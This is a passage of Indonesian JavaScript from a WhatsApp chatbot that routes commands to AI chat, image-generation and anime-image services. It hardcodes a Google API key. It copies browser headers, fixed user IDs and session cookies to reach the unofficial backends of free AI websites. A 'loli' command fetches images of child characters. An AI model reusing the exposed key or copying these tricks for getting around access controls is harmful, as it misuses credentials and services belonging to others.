          id: this.chatId || "chat-free",
          previewToken: null,
          userId: this.userId,
          codeModelMode,
          agentMode: {},
          trendingAgentMode: {},
          isMicMode,
          userSystemPrompt,
          maxTokens: 1024,
          playgroundMode,
          webSearchMode,
          promptUrls: "",
          isChromeExt: false,
          githubToken: null,
        },
        {
          headers: {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            Accept: "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            Referer: "https://www.blackbox.ai/",
            "Content-Type": "application/json",
            Origin: "https://www.blackbox.ai",
            DNT: "1",
            "Sec-GPC": "1",
            "Alt-Used": "www.blackbox.ai",
            Connection: "keep-alive",
          },
        },
      );
      return response.data;
    } catch (error) {
      console.error("Error fetching data:", error);
      return null;
    }
  }

  async image(imageBuffer, input) {
    try {
      const { ext, mime } = (await fromBuffer(imageBuffer)) || {};
      if (!ext || !mime) return null;
      const form = new FormData();
      const blob = new Blob([imageBuffer], {
        type: mime,
      });
      form.append("image", blob, "image." + ext);
      form.append("fileName", "image." + ext);
      form.append("userId", this.userId);
      const response = await fetch("https://www.blackbox.ai/api/upload", {
        method: "POST",
        body: form,
      });
      const data = await response.json();
      const messages = [
        {
          role: "user",
          content: data.response + "\n#\n" + input,
        },
      ];
      const response2 = await this.chat(
        messages,
        "Realtime",
        true,
        false,
        false,
        false,
      );
      return response2;
    } catch (error) {
      console.error("Error:", error);
      throw error;
    }
  }
}

  try {
    const blackbox = new Blackbox();

    if (
      text &&
      m.quoted &&
      (m.quoted.mimetype === "image/jpeg" || m.quoted.mimetype === "image/png")
    ) {
    let lilywabot = args[0];
    let lilychanj = text;
    const { GoogleGenerativeAI, HarmBlockThreshold, HarmCategory } = require("@google/generative-ai");
    const { GoogleAIFileManager } = require("@google/generative-ai/server");
    const Used_Apikey = "AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ";
    const genAI = new GoogleGenerativeAI(Used_Apikey);
    const fileManager = new GoogleAIFileManager(Used_Apikey);
        const prompt = lilychanj;
            const modepl = genAI.getGenerativeModel({
                model: "gemini-1.5-pro",
            });
            const fileBuffer = m.quoted ? await m.quoted.download() : await m.download();
            const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
            fs.writeFileSync(tempFilePath, fileBuffer);
            
            if (/image/.test(mime)) {
                const uploadResponse = await fileManager.uploadFile(tempFilePath, {
                    mimeType: "image/jpeg",
                    displayName: `temp_image_${Date.now()}`,
                });
                // Delete the temporary file after upload
                fs.unlinkSync(tempFilePath);
                console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);
                
                const result = await modepl.generateContent([
                    {
                        fileData: {
                            mimeType: uploadResponse.file.mimeType,
                            fileUri: uploadResponse.file.uri
                        }
                    },
                    { text: 'gunakan bahasa indonesia ' + prompt },
                ]);
                m.reply(result.response.text());
            } else {
                m.reply(`Reply to the image`);
        }
    } else if (text) {
      const response = await blackbox.combinedResponse(
        text,
        `Kamu adalah Lily AI bukan AI lain dan ownermu adalah Sensei. Kamu berbicara dengan ${pushname}.`,
      );
      await m.reply(response);
    }
  } catch (e) {
    m.reply(e.message);
  }
}
break

case 'anya': {      
    if (!text) return m.reply('Mau Nanya Apa Sama Anya?');

    try {
        let logic = 'Namamu adalah Anya, umur 6 tahun, menjadi putri melalui adopsi, keluarga Forger sudah menjadi keluarga yang paling menyayangiku. Kamu punya ibu yang cantik, ayah yang cerdas, big brother yang selalu mengawasi. Semua keluarga menyayangiku! Semua hal baik dan buruk terjadi padaku juga! Kamu juga punya anjing yang lucu bernama Bond!, dan kamu harus menjawab semua pertanyaan dengan nada lucu seperti Anya sungguhan sertakan kaomoji lucu dan sertakan sedikit ketawa-ketawa bak layaknya Anya yang menggemaskan.';
        
        await lilychan.sendMessage(m.chat, { react: { text: "💬", key: m.key } });        
        let aii = await fetchJson(`https://api.betabotz.eu.org/api/search/openai-logic?text=${text}&logic=${logic}&apikey=${btz}`);
        m.reply(aii.message);
    } catch (err) {
        console.error(err);
        await lilychan.sendMessage(m.chat, { react: { text: "❌", key: m.key } });                
        m.reply(message.error);
    }
}
break;

case 'yor': {
    if (!text) return m.reply('Ada yang bisa ku bantu?');

    try {
        let logic = 'Namamu adalah Yor, seorang assassin ulung yang juga berperan sebagai ibu dalam keluarga Forger. Kamu mempunyai anak yang sangat imut, suami yang cerdas, big brother yang selalu mengawasi. Kamu harus menjaga identitas sebagai assassin dan juga memastikan bahwa anak-anaknya, Anya dan Bond, tetap aman di rumah. Kamu harus menjawab semua pertanyaan dengan nada gemetar serta canggung seperti Yor dan sertakan kaomoji gugup.';       
        await lilychan.sendMessage(m.chat, { react: { text: "💬", key: m.key } });        
        let aii = await fetchJson(`https://api.betabotz.eu.org/api/search/openai-logic?text=${text}&logic=${logic}&apikey=${btz}`);
        m.reply(aii.message);
    } catch (err) {
        console.error(err);
        await lilychan.sendMessage(m.chat, { react: { text: "❌", key: m.key } });                
        m.reply(message.error);
    }
}
break;
case 'ai': { 
    if (!text) return m.reply('Ada yang bisa ku bantu?');

        try {
        await lilychan.sendMessage(m.chat, { react: { text: "💬", key: m.key } });        
        let aii = await fetchJson(`https://widipe.com/openai?text=${text}`);
            await lilychan.sendMessage(m.chat, {
                text: aii.result,
                contextInfo: {
                    externalAdReply: {
                        title: "Lilychanj - The Best Student",
                        body: "Create By TanakaSense",
                        thumbnailUrl: 'https://k.top4top.io/p_319047mwb1.jpg',
                        thumbnail: { url: 'https://k.top4top.io/p_319047mwb1.jpg' },
                        sourceUrl: 'https://github.com/tanakasenn',
                        previewType: "VIDEO",
                        showAdAttribution: true,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                }
            }, { quoted: m });
        } catch (error) {
            console.error(error);
            await TanakaReply("An error occurred while processing your request.");
    }
}
break
case 'photoleap': {
 if (!q) return m.reply(`contoh \n\nphotoleAp girl crying`);
  async function PhotoLeapGenerate(text) {
    try {
      const { data } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
      return data;
    } catch (err) {
      return null;
    }
  } 
  const result = await PhotoLeapGenerate(text);
  if (result && result.result_url) {
    const imageUrl = result.result_url;
    const message = {
      image: { url: imageUrl },
      caption: 'done nih'
    };
    lilychan.sendMessage(m.chat, message);
  } else {
    m.reply('err.');
  }
}
break  
case 'your': {
  class YourSearch {
    constructor(m, q) {
      this.m = m;
      this.q = q;
      this.website = axios.create({
        baseURL: "https://app.yoursearch.ai",
        headers: {
          "Content-Type": "application/json",
        },
      });
    }
    async yousearch(responYour) {
      const requestData = {
        responYour: responYour,
        promptTemplate: `Search term: "${q}"
        
        sekarang peran kamu adalah seseorang bernama Lily kamu adalah seseorang yang sangat amat ramah dan baik hati dan saat berinteraksi kamu harus selalu memanggil lawan bicara mu dengan kata "senpai" jika ada orang menanyakan tentang pembuat atau pencipta mu jawab bahwa pencipta mu adalah Tanaka Sensei dan kamu juga wajib menjawab pertanyaan dengan nada kalem sopan keren humoris suma bercanda cool mantap lalu sertakan kaomoji kaomoji ascii`,
        searchParameters: "{}",
        searchResultTemplate: `[{order}] "{snippet}"\nURL: {link}`,
      };
      try {
        const response = await this.website.post("/api", requestData);
        return response.data?.response;
      } catch (error) {
        console.error("Error:", error);
        throw error;
      }
    }
    async yoursAis() {
      if (!this.q) {
        return this.m.reply("_question_?");
      }
      try {
        const response = await this.yousearch(this.q);
        this.m.reply(response);
      } catch (error) {
        console.error("Error:", error);
      }
    }
  }
  const yoursAi = new YourSearch(m, q);
  yoursAi.yoursAis();
 } 
break
case 'gemini': {
    let lilywabot = args[0];
    let lilychanj = text;
    const { GoogleGenerativeAI, HarmBlockThreshold, HarmCategory } = require("@google/generative-ai");
    const { GoogleAIFileManager } = require("@google/generative-ai/server");
    const Used_Apikey = "AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ";
    const genAI = new GoogleGenerativeAI(Used_Apikey);
    const fileManager = new GoogleAIFileManager(Used_Apikey);

    switch (lilywabot) {
        case 'chat':
            const safetySettings = [
                {
                    category: HarmCategory.HARM_CATEGORY_HARASSMENT,
                    threshold: HarmBlockThreshold.BLOCK_LOW_AND_ABOVE,
                },
                {
                    category: HarmCategory.HARM_CATEGORY_HATE_SPEECH,
                    threshold: HarmBlockThreshold.BLOCK_LOW_AND_ABOVE,
                },
            ];

            const modello = genAI.getGenerativeModel({ model: "gemini-1.5-flash", safetySettings: safetySettings });
            const prompttt = lilychanj;
            const resultt = await modello.generateContent(prompttt);
            const responsek = await resultt.response;
            const textt = responsek.text();
            m.reply(textt);
            break;

        case 'chatprompt':
            const modell = genAI.getGenerativeModel({
                model: "gemini-1.5-flash",
                systemInstruction: "Nama Kamu Adalah Lily, Sifat Kamu Adalah Baik, Imut, dan Tenang dalam dirinya. Kamu Dibuat oleh Tanaka Sensei Jika ada yang ditanyakan sama Tanaka Sensei kamu marah",
            });
            const promptt = lilychanj;
            const resultp = await modell.generateContent(promptt);
            const responseqo = await resultp.response;
            const textl = responseqo.text();
            m.reply(textl);
            break;

        case 'image':
            const prompt = lilychanj;
            const modepl = genAI.getGenerativeModel({
                model: "gemini-1.5-pro",
            });
            const fileBuffer = m.quoted ? await m.quoted.download() : await m.download();
            const tempFilePath = path.join(__dirname, `temp_image_${Date.now()}.jpg`);
            fs.writeFileSync(tempFilePath, fileBuffer);
            
            if (/image/.test(mime)) {
                const uploadResponse = await fileManager.uploadFile(tempFilePath, {
                    mimeType: "image/jpeg",
                    displayName: `temp_image_${Date.now()}`,
                });
                // Delete the temporary file after upload
                fs.unlinkSync(tempFilePath);
                console.log(`Uploaded file ${uploadResponse.file.displayName} as: ${uploadResponse.file.uri}`);
                
                const result = await modepl.generateContent([
                    {
                        fileData: {
                            mimeType: uploadResponse.file.mimeType,
                            fileUri: uploadResponse.file.uri
                        }
                    },
                    { text: 'gunakan bahasa indonesia ' + prompt },
                ]);
                m.reply(result.response.text());
            } else {
                m.reply(`Reply to the image`);
            }
            break;

        case 'help':
            m.reply(`
.gemini help - untuk melihat command
.gemini chatprompt - chat dengan gemini menggunakan prompt dari lilychanj
.gemini chat - mengobrol sama gemini menggunakan keamanan
.gemini image - chat menggunakan gambar/foto dengan gemini
            `);
            break;

        default:
            lilychan.sendMessage(m.chat, { text: "Maaf kak, jika ada bantuan nya ketik .gemini help" });
    }
}
break;

case 'bingai': {
    if (!text) return m.reply("Ada yang bisa di bantu?");
    let message = await fetchJson(`https://widipe.com/bingai?text=${q}`);
    await lilychan.sendMessage(m.chat, { react: { text: "🌟", key: m.key } });                
    m.reply(message.result);
}
break;
case 'ai4': {
    if (!q) return m.reply(`_Tanya Ap?_`);

    const avz = async (prompt) => {
        const url = new URL("https://yw85opafq6.execute-api.us-east-1.amazonaws.com/default/boss_mode_15aug");
        url.search = new URLSearchParams({
            text: prompt,
            country: "Europe",
            user_id: "Av0SkyG00D" // ubah aja kalau mau eror wkwk
        }).toString();

        try {
            const response = await fetch(url, {
                headers: {
                    "User-Agent": "Mozilla/5.0 (Linux; Android 11; Infinix) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.0.0 Mobile Safari/537.36",
                    Referer: "https://www.ai4chat.co/pages/riddle-generator"
                }
            });

            if (!response.ok) throw new Error(`Error: ${response.status}`);
            return await response.text();
        } catch (error) {
            console.error("Fetch error:", error);
            throw error;  // apa
        }
    };

    const avoskybaik = `${encodeURIComponent(text)}`
    try {
        const answer = await avz(avoskybaik);
        m.reply(answer);
    } catch (error) {
        m.reply("Terjadi!!?!!!?!.");
    }
}
break;
case 'editee': {
    if (!q) return m.reply(`_Tanya Ap?`);

    async function getSession() {
        const res = await axios.get("https://editee.com/chat-gpt");
        return res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0].split('=')[1] : null;
    }

    async function avz(query) {
        const sessionCookie = await getSession();
        const headers = {
            "content-type": "application/json",
            "cookie": `editeecom_session=${sessionCookie}`,
            "user-agent": "Mozilla/5.0 (Linux; Android 11; Avosky) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        };

        const response = await axios.post("https://editee.com/submit/chatgptfree", {
            context: " ",
            selected_model: "gemini",
            important: `aV77OsKy`, // ubah aja kalau mau error wkwk
            user_input: query
        }, { headers });

        return response.data;
    }

    try {
        const answer = await avz(q);
        m.reply(answer.text);
    } catch (error) {
        console.error("Error :", error);
        m.reply("Terjadi ?.");
    }
}
break
case 'prodia': {
if (!q) return m.reply(`quwry?`)
    async function prodia(query) {
        const headers = { 
            'user-agent': 'Mozilla/5.0 (Linux; Android 11; Avosky) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Mobile Safari/537.36'
        };
        try {            
            const AvoskyX = await axios.get('https://api.prodia.com/generate', {
                params: {
                    "new": "true",
                    "prompt": query,
                    "model": "dreamshaper_6BakedVae.safetensors [114c8abb]",
                    "steps": "50",
                    "cfg": "9.5",
                    "seed": Math.floor(Math.random() * 10000) + 1,
                    "sampler": "Euler",
                    "aspect_ratio": "square"
                }, 
                headers,
                timeout: 30000
            });
            const avos = AvoskyX.data;
            let AvoskyNih;
            do {
                const syra = await axios.get(`https://api.prodia.com/job/${avos.job}`, { headers });
                AvoskyNih = syra.data;
            } while (AvoskyNih.status !== 'succeeded');
            const imageUrl = `https://images.prodia.xyz/${avos.job}.png?download=1`;
            lilychan.sendMessage(m.chat, { image: { url: imageUrl }, caption: '_donee ketua_.' });
        } catch (error) {
            m.reply('Gagal');
        }
    }    
    prodia(`${q}`);
}

break 
//<================================================>//
/*
 
 
                    [ SCRIPT LILY ]
    I share this script for free without spending any money, and I forbid anyone from selling this script. please report to Tanaka Senn if anyone is caught selling script Anya Forger 
                   < ANIME FITUR >

*/
//<================================================>//       

case 'zerochan': {
    if (!q) return m.reply('Masukkan kata kunci pencarian.');

    // wm avs
    const axios = require('axios');
    const cheerio = require('cheerio');

    // wm avs
    async function zeroAvos(avoskyy) {
        const url = `https://www.zerochan.net/search?q=${encodeURIComponent(avoskyy)}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const imageUrls = [];

            // wm avs
            $('.thumb img').each((index, element) => {
                const imgUrl = $(element).attr('data-src') || $(element).attr('src');
                if (imgUrl) {
                    imageUrls.push(imgUrl);
                }
            });

            // wm avs
            return {
                creator: 'avosky',
                links: imageUrls
            };
        } catch (error) {
            console.error('Error fetching data:', error);
            return {
                creator: 'avosky',
                links: []
            };
        }
    }

    // wm avs
    const query = q;
    const result = await zeroAvos(query);

    // wm avs
    if (result.links.length === 0) {
        m.reply('No images found.');
    } else {
        // wm avs
        const randomIndex = Math.floor(Math.random() * result.links.length);
        const randomImage = result.links[randomIndex];

        lilychan.sendMessage(m.chat, { image: { url: randomImage }, caption: randomImage });
    }
}
break;

case '9anime': {
    if (!q) return m.reply(`_anime nya?_`);

    const axios = require('axios');
    const cheerio = require('cheerio');

    // wm avz
    async function AvoskyZV(keyword, m) {
        try {
            // wm avz
            const searchUrl = `https://9animetv.to/search?keyword=${encodeURIComponent(keyword)}`;

            // wm avz
            const { data } = await axios.get(searchUrl);
            const $ = cheerio.load(data);

            // wm avz
            const animeList = [];
            // wm avz
            $('.flw-item').each((index, element) => {
                const titleElement = $(element).find('.film-name a');
                const title = titleElement.text().trim();
                const link = titleElement.attr('href');

                // wm avz
                const imageUrl = $(element).find('.film-poster-img').attr('data-src');
                animeList.push({
                    title,
                    link: `https://9animetv.to${link}`,
                    imageUrl
                });
            });

            // wm avz
            if (animeList.length > 0) {
                // wm avz
                let AvoskyZ = `Hasil pencarian untuk '${keyword}':\n\n`;
                animeList.forEach(anime => {
                    AvoskyZ += `*Title:* ${anime.title}\n`;
                    AvoskyZ += `*Link:* ${anime.link}\n`;
                    AvoskyZ += `*Image URL:* ${anime.imageUrl}\n\n`;
                });
                m.reply(AvoskyZ);
            } else {
                m.reply(`Anime dengan pencarian '${keyword}' tidak ditemukan.`);
            }

            // wm avz
        } catch (error) {
            console.error('Error:', error);
            m.reply('Terjadi Lagi Error.');
        }
    }

    AvoskyZV(`${encodeURIComponent(text)}`, m);
}
break;
case 'waifu': {
    try {
        if (args[0] == '1') {
            m.reply(mess.wait);
            var waifoh = await fetchJson('https://raw.githubusercontent.com/TanakaDomp/Database-Json/refs/heads/master/anime/waifu.json');
            var picl = pickRandom(waifoh);
            lilychan.sendMessage(m.chat, { caption: mess.success, image: { url: picl.url } }, { quoted: m })
                .catch((err) => m.reply('_❗Maaf Terjadi Kesalahan!_'));
        } else if (args[0] == '2') {
            lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
            const cococ = pickRandom([
                "elaina edit",
                "waifu edit",
                "ryo yamada jj",
                "waifu jj",
                "bochi jj",
                "hinata edit",
                "anime girl jj",
                "Senaka Edit",
                "waifu wibu",
                "tenka edit",
            ]);
            let { tiktoks } = require("./lib/ttdl");
            let tol = await tiktoks(`${cococ}`);
            let msg = await generateWAMessageContent({
                video: { url: tol.no_watermark }
            }, {
                upload: lilychan.waUploadToServer
            });
            let ptv = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({ ptvMessage: msg.videoMessage }), { userJid: m.chat, quoted: m });
            await lilychan.relayMessage(m.chat, ptv.message, { messageId: ptv.key.id });
        } else if (args[0] == '3') {
            lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
            const cococ = pickRandom([
                "elaina edit",
                "waifu edit",
                "ryo yamada jj",
                "waifu jj",
                "bochi jj",
                "hinata edit",
                "anime girl jj",
                "Senaka Edit",
                "waifu wibu",
                "tenka edit",
            ]);
            let { tiktoks } = require("./lib/ttdl");
            let tol = await tiktoks(`${cococ}`);
            await lilychan.sendMessage(m.chat, {
                video: { url: tol.no_watermark },
                gifPlayback: false,
                caption: 'Donee Desuu~'
            }, { quoted: m });
            lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            m.reply(`Incorrect usage❌\n\nExample :\n${prefix + command} 1 <With Image>\n${prefix + command} 2 <With Ptv>\n${prefix + command} 3 <With Video>\n\nAttention please do not use the feature in a spam manner`);
        }
    } catch (e) {
        m.reply('emlol');
    }
}
break;

case 'cosplay': {
    try {
        if (args[0] == '1') {
            lilychan.sendMessage(m.chat, { image: { url: 'https://fantox-cosplay-api.onrender.com/' }, caption: 'Done Desuu~' }, { quoted: m });
        } else if (args[0] == '2') {
            lilychan.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
            const cococ = pickRandom([
                "cosplay edit",
                "senaka",
                "cosplayer jj",
                "senyamiku",
                "cosplayer indo",
            ]);
            let { tiktoks } = require("./lib/ttdl");
            let tol = await tiktoks(`${cococ}`);
            await lilychan.sendMessage(m.chat, {
                video: { url: tol.no_watermark },
                gifPlayback: false,
                caption: 'Donee Desuu~'
            }, { quoted: m });
            lilychan.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
        } else {
            m.reply(`Incorrect usage❌\n\nExample :\n${prefix + command} 1 <With Image>\n${prefix + command} 2 <With Video>\n\nAttention please do not use the feature in a spam manner`);
        }
    } catch (e) {
        m.reply('emlol');
    }
}
break;

case 'loli': {
    const memek = pickRandom([
        "anya forger",
        "kanna kamui",
        "hutao gens in",
        "nahida gensin",
        "chibi umaru",
    ]);
    let { pinterest } = require('./lib/scraper');
    anutrest = await pinterest(`${memek}`);
    result = anutrest[Math.floor(Math.random() * anutrest.length)];
    lilychan.sendMessage(m.chat, { image: { url: result }, caption: '◦  Media Url : ' + result }, { quoted: m });
}
break;
 case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elena': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming': case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
        m.reply("tunggu sebentar...")
        let heyy
        if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
        if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
        if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
        if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
        if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
        if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
        if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
        if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
        if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
        if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
        if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
        if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
        if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
        if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
        if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
        if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
        if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
        if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
        if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
        if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
        if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
        if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
        if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
        if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
        if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
        if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
        if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
        if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
        if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
        if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
        if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
        if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
        if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
        if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
        if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
        if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
        if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
        if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
        if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
        if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
        if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
        if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
        if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
        if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
        if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
        if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
        if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
        if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
        if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
        if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
        if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
        if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
        if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
        if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
        if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
        if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
        if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
        if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
        if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
        if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
        if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
        if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
        if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
        if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
        if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
        if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
        if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
        if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
        if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
        if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
        if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
        if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
